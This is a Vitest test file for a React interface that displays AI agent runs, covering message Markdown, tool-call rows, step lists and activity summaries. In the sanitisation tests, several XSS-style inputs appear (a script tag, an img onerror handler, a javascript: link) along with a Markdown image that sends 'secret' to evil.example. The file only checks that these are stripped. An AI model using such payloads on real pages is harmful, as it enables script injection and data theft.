import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { JsonView } from "@/components/json-view";

import docsRun from "../fixtures/docs-run.json";
import { runEvent } from "../testing";
import { buildTimeline, type ToolTurn } from "../timeline";
import type { RunEvent } from "../types";
import { currentActivity } from "./activity";
import { AgentMessage } from "./agent-message";
import { StepList } from "./step-list";
import { stepEntries } from "./step-entries";
import { TurnsRail } from "./step-view";
import { ToolCallGroup, ToolCallRow } from "./tool-calls";
import { describeTool, summarizeTools } from "./tool-describe";

const NOW = Date.parse("2026-10-22T12:00:00Z");

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("AgentMessage", () => {
  it("renders Markdown", () => {
    render(<AgentMessage text={"# Title\n\nSome **bold** text.\n\n- one\n- two"} />);
    expect(screen.getByRole("heading", { name: "Title" })).toBeTruthy();
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("drops raw HTML and comments, never rendering them", () => {
    const { container } = render(
      <AgentMessage
        text={
          '<!-- module: src -->\nHi <script>alert(1)</script> <img src=x onerror="alert(2)"> there'
        }
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).not.toContain("module: src");
    expect(container.textContent).toContain("Hi");
  });

  it("drops Markdown images, so no remote URL is fetched", () => {
    const { container } = render(<AgentMessage text="![x](https://evil.example/?q=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("opens links in a new tab and drops javascript: URLs", () => {
    render(<AgentMessage text="[docs](https://example.com) and [bad](javascript:alert(1))" />);
    const docs = screen.getByRole("link", { name: "docs" });
    expect(docs.getAttribute("target")).toBe("_blank");
    expect(docs.getAttribute("rel")).toBe("noreferrer");
    expect(screen.getByText("bad").getAttribute("href") ?? "").not.toContain("javascript");
  });

  it("shows a caret only while streaming", () => {
    const { rerender } = render(<AgentMessage text="Hello" streaming />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBe("true");
    rerender(<AgentMessage text="Hello" />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBeUndefined();
  });
});

describe("JsonView", () => {
  it("opens the first two levels and collapses deeper ones", () => {
    const { container } = render(<JsonView value={{ a: { b: { c: 1 } } }} />);
    const levels = container.querySelectorAll("details");
    expect([...levels].map((d) => d.open)).toEqual([true, true, false]);
  });

  it("copies the pretty-printed JSON", async () => {
    const writeText = vi.fn(() => Promise.resolve());
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    render(<JsonView value={{ path: "src" }} label="arguments" />);
    fireEvent.click(screen.getByRole("button", { name: "Copy arguments" }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('{\n  "path": "src"\n}'));
  });
});

function tool(overrides: Partial<ToolTurn> = {}): ToolTurn {
  return {
    kind: "tool",
    key: 1,
    callId: "c1",
    name: "repo.read_file",
    arguments: { path: "src/app.ts" },
    intent: null,
    output: '{"text": "x"}',
    status: "completed",
    startedAt: "2026-10-22T12:00:00Z",
    endedAt: "2026-10-22T12:00:02Z",
    ...overrides,
  };
}

describe("describeTool", () => {
  it("says what each repo tool did, and what it is doing", () => {
    expect(describeTool("repo.read_file", { path: "a.ts" })).toMatchObject({
      done: "Read",
      doing: "Reading",
      target: "a.ts",
    });
    expect(describeTool("repo.list_files", { path: "." }).target).toBe("repository root");
    expect(describeTool("repo.search", { pattern: "Item" })).toMatchObject({
      done: "Searched for",
      target: "Item",
    });
    expect(describeTool("repo.commit", { message: "docs: add\n\nbody" }).target).toBe("docs: add");
    expect(describeTool("custom.tool", { q: "x" })).toMatchObject({
      done: "Called custom.tool",
      target: "x",
    });
  });

  it("sums up a group of calls", () => {
    const turns = [
      tool(),
      tool({ key: 2 }),
      tool({ key: 3, name: "repo.list_files", arguments: { path: "src" } }),
      tool({ key: 4, name: "repo.search", arguments: { pattern: "x" } }),
    ];
    expect(summarizeTools(turns)).toBe("Read 2 files, listed 1 folder, ran 1 search");
  });
});

describe("ToolCallRow", () => {
  it("is one line until opened, then shows the arguments and the result", () => {
    render(
      <ul>
        <ToolCallRow turn={tool()} />
      </ul>,
    );
    const trigger = screen.getByRole("button", { name: /Read src\/app\.ts/ });
    expect(trigger.getAttribute("aria-expanded")).toBe("false");
    expect(screen.queryByText("Arguments")).toBeNull();
    fireEvent.click(trigger);
    expect(screen.getByRole("group", { name: "repo.read_file arguments" })).toBeTruthy();
    expect(screen.getByRole("group", { name: "repo.read_file result" }).textContent).toContain(
      '"x"',
    );
  });

  it("marks a failed call and shows its plain-text output", () => {
    render(
      <ul>
        <ToolCallRow turn={tool({ output: "no such file", status: "failed" })} />
      </ul>,
    );
    expect(screen.getByTestId("tool-call").dataset.status).toBe("failed");
    const trigger = screen.getByRole("button", { name: /Read src\/app\.ts failed/ });
    fireEvent.click(trigger);
    expect(screen.getByLabelText("repo.read_file result").textContent).toBe("no such file");
  });

  it("says what a call in flight is doing", () => {
    render(
      <ul>
        <ToolCallRow turn={tool({ status: "running", output: null, endedAt: null })} />
      </ul>,
    );
    expect(screen.getByRole("button").textContent).toContain("Reading");
  });
});

describe("ToolCallGroup", () => {
  const turns = [
    tool(),
    tool({ key: 2, arguments: { path: "src/b.ts" }, endedAt: "2026-10-22T12:00:05Z" }),
    tool({ key: 3, name: "repo.list_files", arguments: { path: "src" }, status: "failed" }),
  ];

  it("collapses consecutive calls into one summary line", () => {
    render(<ToolCallGroup turns={turns} />);
    const summary = screen.getByRole("button", { name: /Read 2 files, listed 1 folder/ });
    expect(summary.textContent).toContain("1 failed");
    expect(summary.textContent).toContain("3 tool calls");
    expect(screen.queryAllByTestId("tool-call")).toHaveLength(0);
    fireEvent.click(summary);
    expect(screen.getAllByTestId("tool-call")).toHaveLength(3);
  });

  it("shows the call in flight while the group runs", () => {
    render(
      <ToolCallGroup
        turns={[
          tool(),
          tool({
            key: 2,
            arguments: { path: "src/b.ts" },
            status: "running",
            output: null,
            endedAt: null,
          }),
        ]}
      />,
    );
    expect(screen.getByRole("button").textContent).toContain("Reading src/b.ts…");
  });
});

describe("StepList on the recorded docs run", () => {
  const timeline = buildTimeline(docsRun as RunEvent[]);
  const entries = stepEntries(timeline.steps);

  function list(selected: string | null = null, onSelect = vi.fn()) {
    render(
      <StepList
        entries={entries}
        selected={selected}
        now={NOW}
        kindOf={() => null}
        onSelect={onSelect}
      />,
    );
    return onSelect;
  }

  it("lists each step once, map items and iterations nested under their node", () => {
    list();
    const rows = screen.getAllByTestId("step-row");
    expect(rows.map((r) => r.dataset.key)).toEqual([
      "list_modules",
      "document",
      "document[0]/module-writer",
      "document[1]/module-writer",
      "document[2]/module-writer",
      "combine",
      "revise",
      "revise#1/reviewer",
      "revise#2/reviewer",
      "approve",
    ]);
    // A one-step item is named by the item, not by its node.
    expect(rows[2]!.textContent).toContain("packages/api");
    expect(rows[1]!.textContent).toContain("3 of 3 items");
    // No message block in the list: the answer opens beside it.
    expect(screen.queryAllByTestId("agent-message")).toHaveLength(0);
  });

  it("says in one line what each step did, and shows a gate's time as time waited", () => {
    list();
    const gate = screen.getAllByTestId("step-row").find((r) => r.dataset.nodeId === "approve")!;
    expect(within(gate).getByTestId("step-outline").textContent).toBe("Approved");
    expect(gate.textContent).toMatch(/waited /);
  });

  it("marks the selected row and selects one on click", () => {
    const onSelect = list("combine");
    const rows = screen.getAllByTestId("step-row");
    expect(rows.find((r) => r.dataset.key === "combine")!.getAttribute("aria-current")).toBe(
      "true",
    );
    fireEvent.click(rows[0]!);
    expect(onSelect).toHaveBeenCalledWith("list_modules");
  });

  it("marks each step's status with an icon and a label for screen readers", () => {
    list();
    const first = screen.getAllByTestId("step-row")[0]!;
    expect(first.querySelector(".sr-only")?.textContent).toBe("Done");
  });
});

/** Events of one agent step `w`, one second apart. */
type Ev = [type: string, payload?: RunEvent["payload"]];

function agentStep(events: Ev[], end = true) {
  const all: Ev[] = [["node_started"], ...events, ...(end ? [["node_completed"] as Ev] : [])];
  return buildTimeline(
    all.map(([type, payload], i) => ({ ...runEvent(i + 1, type, payload), node_id: "w" })),
  ).steps[0]!;
}

const call = (id: string, name: string, args: Record<string, unknown>) =>
  ["tool_call", { call_id: id, name, arguments: args }] as [string, RunEvent["payload"]];
const result = (id: string, output = "ok", isError = false) =>
  ["tool_result", { call_id: id, output, is_error: isError }] as [string, RunEvent["payload"]];

describe("TurnsRail: work blocks", () => {
  const writer = () =>
    buildTimeline(docsRun as RunEvent[]).steps.find((s) => s.id === "document")!.items![0]!
      .steps[0]!;

  it("reads a finished turn as one closed line of work and its answer", () => {
    render(<TurnsRail step={writer()} />);
    const [block] = screen.getAllByTestId("work-block");
    const header = within(block!).getAllByRole("button")[0]!;
    expect(header.getAttribute("aria-expanded")).toBe("false");
    expect(header.textContent).toContain("Listed 1 folder, read 2 files");
    expect(header.textContent).toContain("3 tool calls");
    // Only the answer is open: the note sits inside the closed block.
    expect(screen.getAllByTestId("agent-message").map((m) => m.textContent)).toEqual([
      expect.stringContaining("This module holds the api code."),
    ]);
    expect(screen.queryByTestId("tool-group")).toBeNull();
  });

  it("opens on the reasoning, the note and each call titled with its intent", () => {
    render(<TurnsRail step={writer()} />);
    fireEvent.click(within(screen.getByTestId("work-block")).getAllByRole("button")[0]!);
    const reasoning = screen.getByTestId("reasoning");
    expect(reasoning.textContent).toBe("The input is a module path.");
    expect(within(reasoning).getByRole("button").getAttribute("aria-expanded")).toBe("false");
    expect(screen.getByTestId("tool-intent").textContent).toBe("See what the module holds");
    // The two reads with no intent fold into one row.
    expect(screen.getAllByTestId("tool-group").map((g) => g.textContent)).toEqual([
      expect.stringContaining("See what the module holds"),
      expect.stringContaining("Read 2 files"),
    ]);
    expect(screen.getAllByTestId("agent-message")[0]!.textContent).toBe(
      "I will look at the files of packages/api first.",
    );
  });

  it("shows the rest of the reasoning on expand, as plain text", () => {
    const step = agentStep([
      ["reasoning_delta", { text: "First <b>line</b>\nSecond " }],
      ["reasoning_delta", { text: "**line**" }],
      call("c", "repo.read_file", { path: "a" }),
      result("c"),
      ["message", { text: "Done." }],
    ]);
    render(<TurnsRail step={step} />);
    fireEvent.click(within(screen.getByTestId("work-block")).getAllByRole("button")[0]!);
    const reasoning = screen.getByTestId("reasoning");
    fireEvent.click(within(reasoning).getByRole("button"));
    expect(reasoning.textContent).toBe("First <b>line</b>Second **line**");
    expect(reasoning.querySelector("b, strong")).toBeNull();
  });

  it("shows an intent as text, never as HTML", () => {
    const step = agentStep([
      call("c", "repo.read_file", { path: "a", description: "Read <img src=x> **it**" }),
      result("c"),
      ["message", { text: "Done." }],
    ]);
    render(<TurnsRail step={step} />);
    fireEvent.click(within(screen.getByTestId("work-block")).getAllByRole("button")[0]!);
    const intent = screen.getByTestId("tool-intent");
    expect(intent.textContent).toBe("Read <img src=x> **it**");
    expect(intent.querySelector("img, strong")).toBeNull();
  });

  it("opens a block with a failed call and counts the failure", () => {
    const step = agentStep([
      call("c", "repo.read_file", { path: "a" }),
      result("c", "no such file", true),
      ["message", { text: "I could not read it." }],
    ]);
    render(<TurnsRail step={step} />);
    const header = within(screen.getByTestId("work-block")).getAllByRole("button")[0]!;
    expect(header.getAttribute("aria-expanded")).toBe("true");
    expect(header.textContent).toContain("1 failed");
    expect(screen.getByTestId("tool-preview").textContent).toBe("no such file");
  });

  it("is just the answer when the agent did no work", () => {
    render(<TurnsRail step={agentStep([["message", { text: "Hello." }]])} />);
    expect(screen.queryByTestId("work-block")).toBeNull();
    expect(screen.getByTestId("agent-message").textContent).toBe("Hello.");
  });

  it("says what a live block is doing, with a timer that ticks", () => {
    vi.useFakeTimers({ now: Date.parse("2026-10-21T12:00:04Z") });
    try {
      const step = agentStep(
        [
          call("c1", "repo.list_files", { path: "." }),
          result("c1"),
          call("c2", "repo.read_file", {
            path: "web/package.json",
            description: "Read the config",
          }),
        ],
        false,
      );
      render(<TurnsRail step={step} />);
      const block = screen.getByTestId("work-block");
      const header = within(block).getAllByRole("button")[0]!;
      expect(header.getAttribute("aria-expanded")).toBe("true");
      expect(screen.getByTestId("work-title").textContent).toBe("Read the config…");
      const elapsed = screen.getByTestId("work-elapsed");
      expect(elapsed.getAttribute("aria-hidden")).toBe("true");
      // The step started at second 1.
      expect(elapsed.textContent).toBe("3s");
      act(() => vi.advanceTimersByTime(2000));
      expect(elapsed.textContent).toBe("5s");
    } finally {
      vi.useRealTimers();
    }
  });

  it("closes a live block once the answer starts, unless the user opened it", () => {
    const step = agentStep([call("c", "repo.read_file", { path: "a" }), result("c")], false);
    const { rerender } = render(<TurnsRail step={step} />);
    const header = () => within(screen.getByTestId("work-block")).getAllByRole("button")[0]!;
    expect(header().getAttribute("aria-expanded")).toBe("true");
    const answered = agentStep(
      [call("c", "repo.read_file", { path: "a" }), result("c"), ["text_delta", { text: "So" }]],
      false,
    );
    rerender(<TurnsRail step={answered} />);
    expect(header().getAttribute("aria-expanded")).toBe("false");
    expect(header().textContent).toContain("Read 1 file");
  });
});

describe("previews and the rail", () => {
  const write = tool({
    key: 5,
    name: "repo.write_file",
    arguments: { path: "docs/a.md", content: "# A\n\nline 2\nline 3\nline 4\nline 5\nline 6" },
  });

  it("previews what a write wrote, and how much more there is", () => {
    render(
      <ul>
        <ToolCallRow turn={write} />
      </ul>,
    );
    const preview = screen.getByTestId("tool-preview");
    expect(preview.querySelector("pre")?.textContent).toBe("# A\n\nline 2\nline 3");
    expect(preview.textContent).toContain("+3 more lines");
  });

  it("previews a failure's error, and nothing for a quiet read", () => {
    render(
      <ul>
        <ToolCallRow turn={tool({ status: "failed", output: "no such file" })} />
        <ToolCallRow turn={tool({ key: 2 })} />
      </ul>,
    );
    expect(screen.getAllByTestId("tool-preview").map((p) => p.textContent)).toEqual([
      "no such file",
    ]);
  });

  it("keeps a write on its own line instead of in a group of reads", () => {
    const steps = buildTimeline([
      { ...runEvent(1, "node_started"), node_id: "w" },
      ...[2, 3].flatMap((seq) => [
        {
          ...runEvent(seq * 2, "tool_call", {
            call_id: `r${seq}`,
            name: "repo.read_file",
            arguments: { path: `f${seq}` },
          }),
          node_id: "w",
        },
        {
          ...runEvent(seq * 2 + 1, "tool_result", { call_id: `r${seq}`, output: "x" }),
          node_id: "w",
        },
      ]),
      {
        ...runEvent(8, "tool_call", {
          call_id: "w1",
          name: "repo.write_file",
          arguments: { path: "a.md", content: "hi" },
        }),
        node_id: "w",
      },
      { ...runEvent(9, "tool_result", { call_id: "w1", output: "ok" }), node_id: "w" },
    ]).steps;
    render(<TurnsRail step={steps[0]!} />);
    const groups = screen.getAllByTestId("tool-group");
    expect(groups.map((g) => g.textContent?.includes("Read 2 files"))).toEqual([true, false]);
    expect(screen.getByTestId("tool-preview").textContent).toBe("hi");
  });
});

describe("currentActivity", () => {
  it("says what the latest running step is doing", () => {
    const timeline = buildTimeline([
      { ...runEvent(1, "node_started"), node_id: "writer" },
      {
        ...runEvent(2, "tool_call", {
          call_id: "c",
          name: "repo.read_file",
          arguments: { path: "a.ts" },
        }),
        node_id: "writer",
      },
    ]);
    expect(currentActivity(timeline)).toEqual({
      where: "writer",
      doing: "Reading",
      target: "a.ts",
      running: 1,
    });
  });

  it("names a map item by its path and counts what runs at once", () => {
    const timeline = buildTimeline([
      { ...runEvent(1, "node_started"), node_id: "document" },
      {
        ...runEvent(2, "map_item_started", { index: 0, item: { path: "src/a" } }),
        node_id: "document",
      },
      { ...runEvent(3, "node_started", { item: 0 }), node_id: "w" },
      {
        ...runEvent(4, "map_item_started", { index: 1, item: { path: "src/b" } }),
        node_id: "document",
      },
      { ...runEvent(5, "node_started", { item: 1 }), node_id: "w" },
      { ...runEvent(6, "text_delta", { text: "Hi", item: 1 }), node_id: "w" },
    ]);
    expect(currentActivity(timeline)).toMatchObject({
      where: "src/b",
      doing: "Writing",
      running: 2,
    });
  });

  it("is null once nothing runs", () => {
    expect(currentActivity(buildTimeline(docsRun as RunEvent[]))).toBeNull();
  });
});
